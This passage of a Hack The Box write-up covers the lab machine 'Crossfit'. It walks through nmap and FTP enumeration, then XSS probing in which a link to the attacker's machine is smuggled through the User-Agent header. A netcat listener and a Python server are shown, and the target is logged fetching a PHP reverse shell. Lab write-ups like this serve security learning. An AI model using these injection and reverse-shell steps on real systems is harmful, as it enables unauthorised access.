<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hack the Box - Crossfit Writeup" /><meta property="og:locale" content="en_US" /><meta name="description" content="Zweilosec’s write-up on the insane-difficulty Linux machine Crossfit from https://hackthebox.eu" /><meta property="og:description" content="Zweilosec’s write-up on the insane-difficulty Linux machine Crossfit from https://hackthebox.eu" /><link rel="canonical" href="https://zweilosec.github.io/posts/crossfit/" /><meta property="og:url" content="https://zweilosec.github.io/posts/crossfit/" /><meta property="og:site_name" content="Hacker’s Rest" /><meta property="og:image" content="https://zweilosec.github.io/assets/img/0-crossfit-infocard.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-03-19T14:00:00+00:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://zweilosec.github.io/assets/img/0-crossfit-infocard.png" /><meta property="twitter:title" content="Hack the Box - Crossfit Writeup" /><meta name="twitter:site" content="@zweilosec" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-05-03T22:47:36+00:00","datePublished":"2021-03-19T14:00:00+00:00","description":"Zweilosec’s write-up on the insane-difficulty Linux machine Crossfit from https://hackthebox.eu","headline":"Hack the Box - Crossfit Writeup","image":"https://zweilosec.github.io/assets/img/0-crossfit-infocard.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://zweilosec.github.io/posts/crossfit/"},"url":"https://zweilosec.github.io/posts/crossfit/"}</script><title>Hack the Box - Crossfit Writeup | Hacker's Rest</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Hacker's Rest"><meta name="application-name" content="Hacker's Rest"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=UA-170504820-1"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-170504820-1'); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/avatar/katana.gif" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Hacker's Rest</a></div><div class="site-subtitle font-italic">Notes documenting my journey to OSCP and beyond.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>PS C:\>WHOAMI</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/zweilosec" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/zweilosec" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack the Box - Crossfit Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack the Box - Crossfit Writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> zweilosec </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Fri, Mar 19, 2021, 2:00 PM +0000" prep="on" > Mar 19, 2021 <i class="unloaded">2021-03-19T14:00:00+00:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Mon, May 3, 2021, 3:47 PM -0700" prefix="Updated " > May 3, 2021 <i class="unloaded">2021-05-03T22:47:36+00:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="13848 words">76 min</span></div><div><meta name="twitter:card" content="summary"><meta name="twitter:site" content="@zweilosec"></div></div><div class="post-content"><h2 id="htb---crossfit">HTB - Crossfit</h2><h2 id="overview">Overview</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/0-crossfit-infocard.png" alt="" /></p><p>This Insane-difficulty machine from Hack The Box took far longer to root than I would have liked, mostly due to getting hung up on the the final exploit. I took a break from it, after getting the user.txt, due to frustration and wanting to make progress elsewhere. This machine challenged me in a number of areas, from creative enumeration methods, to code and binary analysis, to “exploit” writing in a foreign language (JavaScript and C!). After taking a break for a few months, I came back with a fresh perspective and was able to quickly discover the errors I had been making. (Along with fresh patience with the quick-clean script the authors used!). A script to automate all of the moving pieces of the final exploit solved my issues and I was able to root the machine.</p><h2 id="useful-skills-and-tools">Useful Skills and Tools</h2><h3 id="connecting-to-secure-ftp-using-lftp">Connecting to Secure FTP using lftp</h3><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nv">$ </span>lftp
lftp :~&gt; <span class="nb">set </span>ftp:ssl-force <span class="nb">true
</span>lftp :~&gt; connect <span class="nv">$domain</span>
lftp domain:~&gt; login <span class="nv">$username</span>
</pre></table></code></div></div><p>NOTE: If the server is making use of self signed certificates you may need to add this as well:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>lftp :~&gt; <span class="nb">set </span>ssl:verify-certificate no
</pre></table></code></div></div><h2 id="enumeration">Enumeration</h2><h3 id="nmap-scan">Nmap scan</h3><p>I started my enumeration with an nmap scan of <code class="language-plaintext highlighter-rouge">10.10.10.208</code>. The options I regularly use are:</p><div class="table-wrapper"><table><thead><tr><th style="text-align: left"><code class="language-plaintext highlighter-rouge">Flag</code><th style="text-align: left">Purpose<tbody><tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-p-</code><td style="text-align: left">A shortcut which tells nmap to scan all ports<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-vvv</code><td style="text-align: left">Gives very verbose output so I can see the results as they are found, and also includes some information not normally shown<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-sC</code><td style="text-align: left">Equivalent to <code class="language-plaintext highlighter-rouge">--script=default</code> and runs a collection of nmap enumeration scripts against the target<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-sV</code><td style="text-align: left">Does a service version scan<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-oA $name</code><td style="text-align: left">Saves all three formats (standard, greppable, and XML) of output with a filename of <code class="language-plaintext highlighter-rouge">$name</code></table></div><blockquote><p>All this time I did not know that there were more levels of verbosity, I had just been using <strong><code class="language-plaintext highlighter-rouge">-v</code></strong> to get information as it was discovered instead of waiting for the scan to finish. I will be using <strong><code class="language-plaintext highlighter-rouge">-vvv</code></strong> from now on!</p></blockquote><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/crossfit]
└─$ nmap -sCV -n -p- -Pn -vvv 10.10.10.208
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-28 12:30 EST
Nmap scan report for 10.10.10.208

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 2.0.8 or later
| ssl-cert: Subject: commonName=*.crossfit.htb/organizationName=Cross Fit Ltd./stateOrProvinceName=NY/countryName=US/emailAddress=info@gym-club.crossfit.htb
| Issuer: commonName=*.crossfit.htb/organizationName=Cross Fit Ltd./stateOrProvinceName=NY/countryName=US/emailAddress=info@gym-club.crossfit.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-04-30T19:16:46
| Not valid after:  3991-08-16T19:16:46
| MD5:   557c 36e4 424b 381e eb17 708a 6138 bd0f
| SHA-1: 25ec d2fe 6c9d 7704 ec7d d792 8767 4bc3 8d0e cbce
| -----BEGIN CERTIFICATE-----
| MIID0TCCArmgAwIBAgIUFlxL1ZITpUBfx69st7fRkJcsNI8wDQYJKoZIhvcNAQEL
| BQAwdzELMAkGA1UEBhMCVVMxCzAJBgNVBAgMAk5ZMRcwFQYDVQQKDA5Dcm9zcyBG
| aXQgTHRkLjEXMBUGA1UEAwwOKi5jcm9zc2ZpdC5odGIxKTAnBgkqhkiG9w0BCQEW
| GmluZm9AZ3ltLWNsdWIuY3Jvc3NmaXQuaHRiMCAXDTIwMDQzMDE5MTY0NloYDzM5
| OTEwODE2MTkxNjQ2WjB3MQswCQYDVQQGEwJVUzELMAkGA1UECAwCTlkxFzAVBgNV
| BAoMDkNyb3NzIEZpdCBMdGQuMRcwFQYDVQQDDA4qLmNyb3NzZml0Lmh0YjEpMCcG
| CSqGSIb3DQEJARYaaW5mb0BneW0tY2x1Yi5jcm9zc2ZpdC5odGIwggEiMA0GCSqG
| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQDgibxJvtPny7Vee6M0BFBPFBohEQ+0zLDq
| LdkW/OSl4tfEdZYn6U5cNYKTyYJ8CuytGlMpFw5OgOBPATtBYoGrQZdlN+7LQwF+
| CZsedPs30ijAhygI7pM5S0hwiqdVReR/hhFHD/zry3M5+9NGeDLPgLbQG8qgPspv
| Y+ErCXXotxVI+VrTPfGkjPixfgUTYsEetrkmXlig0S2ukxmNs7HXkjli4Z+qpGrn
| mpFQokBE6RlD6VjxPzx0pfgK587s7F0/pIfXTHGfIOMnqXuLKBXsYIAEjJQxlLUt
| U3lb7aZdqIZnvhTuzuOxFUIe5dRWyfERyODEd5WUlwsbY4Qo2HhZAgMBAAGjUzBR
| MB0GA1UdDgQWBBTG3S2NuuXiSQ4dRvDnLqiWQdvY7jAfBgNVHSMEGDAWgBTG3S2N
| uuXiSQ4dRvDnLqiWQdvY7jAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUA
| A4IBAQB/tGKHZ9oXsqLGGW0wRRgCZj2adl1sq3S69e9R4yVQW7zU2Sw38CAA/O07
| MEgbqrzUI0c/T+Wb1D+gRamCUxSB7FXfMzGRhwUqMsLp8uGNlxyDcMU34ecRwOil
| r4jLmfeGyok1r8CFHg8Om1TeZfzNeVtkAkqf3XoIxbKQk4s779n/84FAtLkZNqyb
| cSv8nnClQQSlf42P3AiRBbwM1Cx9SyKq977sIwOzKTOM4NcSivNdtov+Pc0z+T9I
| 95SsqLKtO/8T0h6hgY6JQG1+A4ivnlZ8nqSFWYsnX10lJN2URlAwXUYuTw0vCMy+
| Xk0OmbR/oG052H02ZsmfJQhqPNF1
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 b0:e7:5f:5f:7e:5a:4f:e8:e4:cf:f1:98:01:cb:3f:52 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCptno1XfLYf/kqcp6gzw/aP/qsmcpgjmJMckOswoHnQdrHb4NdPVNUX2pXPfHOz3it3uO85dLnInCGL1eYrtp0TAGAbxWZqGHtfzTTDqfOlPVzxGrQBIUVRYCpRWmJrMOEPfGnMOFwqTWWS9lpxhGytVc7PWPrI+xbHCx8K1FoAbu/0gq4ma9E4QnVKLj+WBWdGbODYP7WDHJgPOLZrmVoFNH4Kf16MOHcU9ZkCLBFlcJDwpa1I42KA8z8Plb0nuf5Oz2KOvc8OGe2tdNPwyR5RBfI6moAUcpf4yUVZA7nwqtQI1hMTZt51tP9Vi5+vHiEwSzFNMD7wFhL5/4FqD/D
|   256 67:88:2d:20:a5:c1:a7:71:50:2b:c8:07:a4:b2:60:e5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLWxr9V/NOESy7Mp0R4sTB0XMbGT79jDzOSrazVbblv3cIdNSCEqaw5+YYp2177KEQ0fFKB7pir9DMKhv6WTYAk=
|   256 62:ce:a3:15:93:c8:8c:b6:8e:23:1d:66:52:f4:4f:ef (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO5alU2Zh/TEwtrokhM4tkASihaiA38IKBWk7tFRoXWR
80/tcp open  http    syn-ack Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: Host: Cross; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 47.99 seconds
</pre></table></code></div></div><p>The scan showed that there were only three TCP ports open, 21 - FTP, 22 - SSH, and 80 - HTTP.</p><h3 id="port-21---ftp">Port 21 - FTP</h3><p>My first target was any potential low-hanging fruit that may have been accessed through FTP.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>21/tcp open  ftp     syn-ack vsftpd 2.0.8 or later
| ssl-cert: Subject: commonName=*.crossfit.htb/organizationName=Cross Fit Ltd./stateOrProvinceName=NY/countryName=US/emailAddress=info@gym-club.crossfit.htb
| Issuer: commonName=*.crossfit.htb/organizationName=Cross Fit Ltd./stateOrProvinceName=NY/countryName=US/emailAddress=info@gym-club.crossfit.htb
</pre></table></code></div></div><p>In my nmap output for port 21 I found two hostnames, <code class="language-plaintext highlighter-rouge">crossfit.htb</code> and <code class="language-plaintext highlighter-rouge">gym-club.crossfit.htb</code>, which I added to my <code class="language-plaintext highlighter-rouge">/etc/hosts/</code> file.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/crossfit]
└─$ ftp crossfit.htb
Connected to crossfit.htb.
220 Cross Fit Ltd. FTP Server
Name (crossfit.htb:zweilos): Anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
</pre></table></code></div></div><p>Without credentials, the first thing I check is whether or not the server accepts anonymous login. I was not able to log in to FTP using anonymous in this case.</p><h3 id="port-80---http">Port 80 - HTTP</h3><p>Next, I saw that there was an Apache web server being hosted on port 80. I opened my web browser and navigated to <code class="language-plaintext highlighter-rouge">crossfit.htb</code> to see what I could find.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/1-default-apache.png" alt="" /></p><p><code class="language-plaintext highlighter-rouge">crossfit.htb</code> only led to the default apache page, meaning there was no default page configured at this address.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/1-gym-club.png" alt="" /></p><p>However, <code class="language-plaintext highlighter-rouge">gym-club.crossfit.htb</code> led to a CrossFit gym website.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/1-wappalyzer.png" alt="" /></p><p>The Wappalyzer Firefox plugin showed me the technologies that were in use on this site. I did a quick search for each of the ones that showed a version number but none led to any useable vulnerabilities.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/1-class-table.png" alt="" /></p><p>The site included a schedule of classes. I took down the names Candy, Murph, Chelsea, and Annie as potential usernames.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/1-join-comingsoon.png" alt="" /></p><p>The link to “Join the club” led to a “coming soon” page, but there was nothing useful there.</p><p>Since I had already found one virtual host for this IP address, as in [HTB - Forwardslash] Fix this link! (../hard/2020-06-06-forwardslash.md) I tried to do vhost enumeration using gobuster. I ran this in the background while enumerating the website.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/crossfit]
└─$ gobuster vhost -u http://crossfit.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:          http://crossfit.htb
[+] Threads:      10
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.0.1
[+] Timeout:      10s
===============================================================
2020/12/28 12:48:42 Starting gobuster
===============================================================
===============================================================
2020/12/28 12:58:32 Finished
===============================================================
</pre></table></code></div></div><p>This did not come up with anything, however. I tried with <code class="language-plaintext highlighter-rouge">ffuf</code> as well, but did not find any more subdomains.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/1-employees.png" alt="" /></p><p>On the “About-Us” page I found four more possible usernames: Becky Taylor, Noah Leonard, Evelyn Fields, and Leroy Guzman. As the Manager, Leroy seemed like the most likely target.</p><h3 id="cross-site-scripting-xss">Cross-site Scripting (XSS)</h3><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/2-xss-test.png" alt="" /></p><p>Since there wasn’t anything obvious to go by, I started doing some basic vulnerability testing on the submission boxes. The first one at <code class="language-plaintext highlighter-rouge">/contact.php</code> did not seem to be vulnerable to either XSS or SQL injection.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/2-xss-test2.png" alt="" /></p><p>However, the second one I found at <code class="language-plaintext highlighter-rouge">/blog-single.php</code> gave a warning about XSS.</p><div class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">'alert alert-danger'</span> <span class="na">role=</span><span class="s">'alert'</span><span class="nt">&gt;</span>
<span class="nt">&lt;h4&gt;</span>
XSS attempt detected
<span class="nt">&lt;/h4&gt;</span>
<span class="nt">&lt;hr&gt;</span>
A security report containing your IP address and browser information will be generated and our admin team will be immediately notified.
<span class="nt">&lt;/div&gt;</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/2-xss-test-caught.png" alt="" /></p><p>The warning claimed that browser information will be sent to the admin. I thought maybe I could smuggle something that would be executed by the admin through the “browser information”: AKA User-Agent.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/2-xss-test-caught-burp.png" alt="" /></p><p>Using Burp I sent a request with a link to my machine in the <code class="language-plaintext highlighter-rouge">User-Agent</code> field. I made sure to send the same XSS attempt so this would be forwarded to the admin.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/crossfit]
└─$ nc -lvnp 8090                       
listening on [any] 8090 ...
connect to [10.10.15.98] from (UNKNOWN) [10.10.10.208] 56252
GET / HTTP/1.1
Host: 10.10.15.98:8090
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://gym-club.crossfit.htb/security_threat/report.php
Connection: keep-alive
</pre></table></code></div></div><p>I received an HTTP GET request to my waiting netcat listener.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/2-security-report-denied.png" alt="" /></p><p>In the <code class="language-plaintext highlighter-rouge">Referer</code> field I saw <code class="language-plaintext highlighter-rouge">/security_threat/report.php</code> in the response headers, but was not able to access it. The code in this PHP file must have been what had checked the XSS request I had made, and somehow executed the <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> tags I had embedded, while creating the report for the admin.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/crossfit]
└─$ python3 -m http.server 8099
Serving HTTP on 0.0.0.0 port 8099 (http://0.0.0.0:8099/) ...
10.10.10.208 - - [28/Dec/2020 14:53:10] "GET /php-reverse-shell.php HTTP/1.1" 200 -
</pre></table></code></div></div><p>In the same spirit I tried to get the admin to download a PHP reverse shell from me, but I couldn’t find where it had been uploaded nor figure out how to execute it.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/2-origin.png" alt="" /></p><p><code class="language-plaintext highlighter-rouge">Origin</code> Header with <code class="language-plaintext highlighter-rouge">Access-Control-Allow-Origin</code> response header</p><h3 id="ftpcrossfithtb">ftp.crossfit.htb</h3><p>I was familiar with fuzzing for vhosts as well as directories and files, but fuzzing for a response in a header was something new. I did some research on more advanced uses of <code class="language-plaintext highlighter-rouge">ffuf</code> and found a few interesting articles.</p><ul><li><a href="https://agentsteal.com/fuzz-parameters-directories-more-with-ffuf/">https://agentsteal.com/fuzz-parameters-directories-more-with-ffuf/</a><li><a href="https://codingo.io/tools/ffuf/bounty/2020/09/17/everything-you-need-to-know-about-ffuf.html#what-is-ffuf--and-what-is-it-used-for-">https://codingo.io/tools/ffuf/bounty/2020/09/17/everything-you-need-to-know-about-ffuf.html#what-is-ffuf–and-what-is-it-used-for-</a></ul><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>zweilos㉿kali<span class="o">)</span>-[~/htb/crossfit]
└─<span class="nv">$ </span>ffuf <span class="nt">-t</span> 25 <span class="nt">-c</span> <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt <span class="nt">-u</span> http://10.10.10.208 <span class="nt">-H</span> <span class="s1">'Origin: http://FUZZ.crossfit.htb'</span> <span class="nt">-mr</span> <span class="s1">'Allow-Origin'</span>               

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
